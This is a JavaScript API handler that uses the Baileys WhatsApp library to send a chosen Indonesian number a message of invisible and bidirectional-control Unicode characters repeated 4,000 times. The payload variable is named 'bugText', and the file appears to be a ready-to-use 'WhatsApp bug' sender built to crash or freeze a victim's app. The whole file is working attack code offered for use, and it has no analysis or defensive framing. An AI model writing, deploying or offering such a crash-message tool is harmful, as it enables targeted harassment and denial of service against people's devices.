import { default as makeWASocket, useSingleFileAuthState } from '@whiskeysockets/baileys';
import { Boom } from '@hapi/boom';
import { join } from 'path';
import { readFileSync, writeFileSync, existsSync } from 'fs';

let sock;
const authFile = join('/tmp', 'auth.json');
const { state, saveState } = useSingleFileAuthState(authFile);

export default async function handler(req, res) {
  if (req.method !== 'POST') {
    return res.status(405).json({ success: false, error: 'Method Not Allowed' });
  }

  const { number } = req.body;
  if (!number || !number.startsWith('62')) {
    return res.status(400).json({ success: false, error: 'Nomor tidak valid' });
  }

  try {
    if (!sock) {
      sock = makeWASocket({
        printQRInTerminal: false,
        auth: state
      });

      sock.ev.on('creds.update', () => {
        writeFileSync(authFile, JSON.stringify(state));
      });
    }

    const jid = number + '@s.whatsapp.net';
    const bugText = '\u2063\u200F\u202E\u200B\u2060'.repeat(4000);

    await sock.sendMessage(jid, { text: bugText });
    return res.status(200).json({ success: true });
  } catch (e) {
    return res.status(500).json({ success: false, error: e.message });
  }
}
